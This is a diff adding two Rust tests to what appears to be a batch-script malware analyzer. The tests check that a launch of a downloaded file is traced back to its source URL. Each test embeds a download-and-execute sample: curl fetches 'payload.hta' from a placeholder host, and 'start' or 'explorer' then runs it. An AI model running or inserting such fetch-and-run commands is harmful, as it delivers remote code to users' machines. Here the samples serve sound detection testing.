@@ -3107,6 +3107,27 @@ for /f "tokens=1 delims=:" %%A in ('curl -# -k "http://www.geoplugin.net/php.gp?
     }
 
     #[test]
+    fn start_current_dir_local_target_resolves_prior_download_source_url() {
+        let report = analyze(
+            br#"curl -o payload.hta https://start-dot-source.example/payload.hta
+start .\payload.hta"#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start .\payload.hta"#
+                            && url == "https://start-dot-source.example/payload.hta"
+                )
+            }),
+            "start current-directory target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
         let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
@@ -11824,6 +11845,27 @@ explorer payload.hta"#,
                 )
             }),
             "Explorer local target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn explorer_current_dir_local_target_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o payload.hta https://explorer-dot-source.example/payload.hta
+explorer .\payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"explorer .\payload.hta"#
+                            && url == "https://explorer-dot-source.example/payload.hta"
+                )
+            }),
+            "Explorer current-directory target did not resolve prior download source: {:?}",
             report.traits
         );
     }
